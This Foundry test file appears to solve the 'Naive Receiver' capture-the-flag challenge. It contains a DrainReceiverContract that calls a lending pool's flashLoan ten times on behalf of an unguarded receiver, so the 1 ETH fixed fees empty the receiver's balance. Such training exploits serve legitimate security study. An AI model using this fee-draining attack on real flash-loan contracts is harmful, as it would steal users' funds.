// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {FlashLoanReceiver} from "../src/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../src/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address player = makeAddr("player");

    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    uint256 public constant ETHER_IN_POOL = 1000 * 1e18;
    uint256 public constant ETHER_IN_RECEIVER = 10 * 1e18;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether;

    function setUp() public {
        vm.deal(deployer, ETHER_IN_POOL + ETHER_IN_RECEIVER);
        vm.startPrank(deployer);
        pool = new NaiveReceiverLenderPool();
        payable(address(pool)).transfer(ETHER_IN_POOL);
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(pool.flashFee(ETH, 0), 1 * 1e18);

        receiver = new FlashLoanReceiver(address(pool));
        payable(address(receiver)).transfer(ETHER_IN_RECEIVER);
        vm.expectRevert();
        receiver.onFlashLoan(deployer, ETH, ETHER_IN_RECEIVER, 1e18, "0x");
        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
        vm.stopPrank();
    }

    function test_drain_receiver() public {
        vm.startPrank(player);
        DrainReceiverContract drain = new DrainReceiverContract(address(pool), address(receiver));
        drain.drain();
        vm.stopPrank();

        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}

contract DrainReceiverContract {
    NaiveReceiverLenderPool pool;
    address payable receiverAddress;

    constructor(address _poolAddress, address _receiverAddress) {
        pool = NaiveReceiverLenderPool(payable(_poolAddress));
        receiverAddress = payable(_receiverAddress);
    }

    function drain() public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(FlashLoanReceiver(receiverAddress), pool.ETH(), 0, "0x");
        }
    }
}
